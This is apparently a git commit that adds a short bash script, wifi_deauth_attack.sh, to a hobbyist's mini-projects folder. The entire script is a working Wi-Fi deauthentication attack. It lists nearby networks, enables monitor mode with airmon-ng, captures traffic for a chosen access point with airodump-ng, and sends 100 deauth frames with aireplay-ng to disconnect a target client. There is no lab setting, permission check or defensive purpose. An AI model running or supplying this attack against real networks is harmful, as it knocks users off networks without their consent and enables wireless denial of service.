2e2ec8fc25726bce0f56de338111e8b0eeb0204a
amitpadhan525 <amitpadhan525@gmail.com>
2025-09-21 19:57:43 +0530

    uplode - 2025-09-21 19:57:43

---
+++ bash_on_arch_linux/mini_projects/wifi_deauth_attack.sh
@@ -0,0 +1,10 @@
+nmcli device wifi list
+read -p "Enter channel :" ch
+read -p "Enter BSSID :" bssid
+
+sudo airmon-ng  start wlan0
+sudo iwconfig wlan0mon channel $ch
+sudo airodump-ng --bssid $bssid -c $ch wlan0mon
+read -p "Enter BSSID of target :" ch1
+sudo aireplay-ng --deauth 100 -a $bssid -c $ch1  wlan0mon
+sudo airmon-ng  stop wlan0mon
